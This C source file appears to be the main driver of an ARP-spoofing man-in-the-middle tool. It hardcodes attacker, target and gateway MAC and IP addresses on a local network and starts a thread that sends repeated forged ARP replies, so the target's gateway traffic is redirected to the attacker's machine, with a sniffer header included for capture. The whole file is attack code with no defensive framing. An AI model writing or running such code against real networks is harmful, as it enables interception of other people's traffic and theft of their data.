#include<unistd.h>
#include<pthread.h>

#include"arp.h"
#include"sniffer.h"

void* arp_spoof(void* info){
	MITM_info* m_info= (MITM_info*)info;
	printf("dev is %s\n",m_info->dev);
	print_ip(m_info->TARGET_IP);
	int p_tag_target;
       	p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
			m_info->TARGET_MAC,m_info->GATEWAY_IP,m_info->TARGET_IP,0);
	 for(int i =0; i < 3;i++){
		 p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,m_info->TARGET_MAC,
				 m_info->GATEWAY_IP,m_info->TARGET_IP,p_tag_target);
		usleep(1000000);
	}
	pthread_exit(NULL);
}

int main(){
	u_char ATTACKER_MAC[6]={0x40,0x9f,0x38,0x82,0xfc,0x2b};
	u_char TARGET_MAC[6]={0xd0,0xc5,0xd3,0x26,0x36,0x77};
	u_char GATEWAY_MAC[6];
	u_char ATTACKER_IP[4]={192,168,43,46};
	u_char TARGET_IP[4]={192,168,43,127};
	u_char GATEWAY_IP[4]={192,168,43,1};
	char errbuf[PCAP_ERRBUF_SIZE];
	char* dev;

	MITM_info info={
		.TARGET_MAC=TARGET_MAC,
		.ATTACKER_MAC=ATTACKER_MAC,
		.GATEWAY_MAC=GATEWAY_MAC,
		.TARGET_IP=TARGET_IP,
		.GATEWAY_IP=GATEWAY_IP,
	};
	
	pthread_t t;
	
	dev = pcap_lookupdev(errbuf);
	if(!dev){
		printf("%s\n",errbuf);
		return 1;
	}
	
	info.dev=dev;
	/* init fake arp and the return value should be the next input to send_fake_arp op */
	pthread_create(&t,NULL,arp_spoof,&info);
	
	pthread_join(t,NULL);
	return 0;
}
